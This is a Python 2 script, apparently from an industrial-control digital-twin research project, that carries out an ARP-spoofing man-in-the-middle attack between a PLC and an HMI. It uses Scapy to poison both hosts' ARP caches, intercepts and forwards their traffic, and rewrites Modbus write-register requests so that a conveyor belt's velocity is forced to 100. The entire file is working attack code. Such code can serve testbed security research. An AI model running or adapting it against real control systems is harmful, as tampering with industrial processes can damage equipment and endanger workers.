#!/usr/bin/env python

from cpstwinning.constants import LOG_FILE_LOC, LOG_LEVEL
from scapy.layers.inet import IP, TCP
from scapy.contrib.modbus import ModbusADURequest, ModbusPDU10WriteMultipleRegistersRequest
from threading import Thread, Event
from scapy.sendrecv import sniff, srp, send, sendp
from scapy.layers.l2 import ARP, Ether
from time import sleep
import logging

# Setup logger
logging.basicConfig(filename=LOG_FILE_LOC, level=LOG_LEVEL)
logging.getLogger("scapy.runtime").setLevel(logging.DEBUG)
# Do not enable IP Forwarding if you want to modify packets!
# e.g., sysctl -w net.ipv4.ip_forward=0

ARP_SPOOF_TIMER = 10

IFACE = 'attacker-eth0'

# PLC
VICTIM1_IP = '192.168.0.1'
# HMI
VICTIM2_IP = '192.168.0.2'

ATTACKER_MAC = 'a2:67:f2:13:1c:06'

shutdown_event = Event()


def arping(src_ip, dst_ip, dst_mac):
    print "ARPing: {} is at {} [dst_ip={}]".format(src_ip, dst_mac, dst_ip)
    arp = ARP(op=2, psrc=src_ip, pdst=dst_ip, hwdst=dst_mac)
    send(arp, iface=IFACE)


class Sniffer(Thread):

    def __init__(self, victims):
        Thread.__init__(self)
        self.victims = victims

    def process_packet(self, packet):

        # Setting attacker's ARP cache is usually not required
        # conf.netcache.arp_cache[self.victims[0][0]] = self.victims[0][1]
        # conf.netcache.arp_cache[self.victims[1][0]] = self.victims[1][1]

        if Ether in packet:
            if packet[Ether].src == ATTACKER_MAC:
                return

        def alter_packet(pkt):
            if Ether in pkt and IP in pkt:
                # Delete checksum, otherwise server/client impl. may reject packet
                if TCP in pkt:
                    del packet[TCP].chksum
                l2 = pkt[Ether]
                # Check if HMI sent request
                if l2.src == self.victims[1][1] and l2.dst == ATTACKER_MAC:
                    pkt[Ether].src = ATTACKER_MAC
                    pkt[Ether].dst = self.victims[0][1]
                    if ModbusADURequest in pkt:
                        if ModbusPDU10WriteMultipleRegistersRequest in pkt:
                            mb_fc_0x10_pkt = pkt[ModbusPDU10WriteMultipleRegistersRequest]
                            starting_addr = mb_fc_0x10_pkt.startingAddr
                            quantity_registers = mb_fc_0x10_pkt.quantityRegisters
                            # Check if HMI attempts to set velocity of conveyor belt
                            if starting_addr == 2 and quantity_registers == 1:
                                # Modify velocity
                                pkt[ModbusPDU10WriteMultipleRegistersRequest].outputsValue = [100]
                elif l2.src == self.victims[0][1] and l2.dst == ATTACKER_MAC:
                    pkt[Ether].src = ATTACKER_MAC
                    pkt[Ether].dst = self.victims[1][1]
            return pkt

        pk = alter_packet(packet)
        if pk is not None:
            sendp(pk, iface=IFACE, verbose=0)

    def run(self):
        sniff(filter='ip', prn=self.process_packet, store=0, iface=IFACE,
              stop_filter=lambda x: shutdown_event.is_set())
        # Note: The stop_filter function is applied to each packet, meaning that sniffing won't stop if we do not
        # receive any packets. See: https://github.com/secdev/scapy/issues/989
        print "Stopped sniffing."


class ArpSpoofing(Thread):

    def __init__(self, victims):
        Thread.__init__(self)
        self.victims = victims

    def run(self):
        while not shutdown_event.is_set():
            arping(self.victims[0][0], self.victims[1][0], ATTACKER_MAC)
            arping(self.victims[1][0], self.victims[0][0], ATTACKER_MAC)
            sleep(ARP_SPOOF_TIMER)


def get_target_mac_addrs(victim1_ip, victim2_ip):
    def get_mac_addr(target, timeout=2, verbose=None):
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=target), verbose=verbose, timeout=timeout,
                     iface_hint=target)
        # for send, received in answered
        for _, recv in ans:
            if Ether in recv:
                return recv[Ether].src

    return get_mac_addr(victim1_ip), get_mac_addr(victim2_ip)


def shutdown(victims):
    def rearping():
        arping(victims[0][0], victims[1][0], victims[0][1])
        arping(victims[1][0], victims[0][0], victims[1][1])

    print 'Shutting down... (reARPing victims)'
    rearping()
    shutdown_event.set()


if __name__ == '__main__':
    print "Starting Modbus ARP Spoofing..."
    victims_mac = get_target_mac_addrs(VICTIM1_IP, VICTIM2_IP)
    if victims_mac[0] is None or victims_mac[1] is None:
        print "Could not retrieve MAC addresses of victims."
        exit(-1)
    print victims_mac
    victs = ((VICTIM1_IP, victims_mac[0]), (VICTIM2_IP, victims_mac[1]))
    sniffer = Sniffer(victs)
    sniffer.start()
    arp_spoof = ArpSpoofing(victs)
    arp_spoof.start()
    try:
        while sniffer.is_alive():
            sniffer.join(timeout=1.0)
        while arp_spoof.is_alive():
            arp_spoof.join(timeout=1.0)
    except (KeyboardInterrupt, SystemExit):
        shutdown(victs)
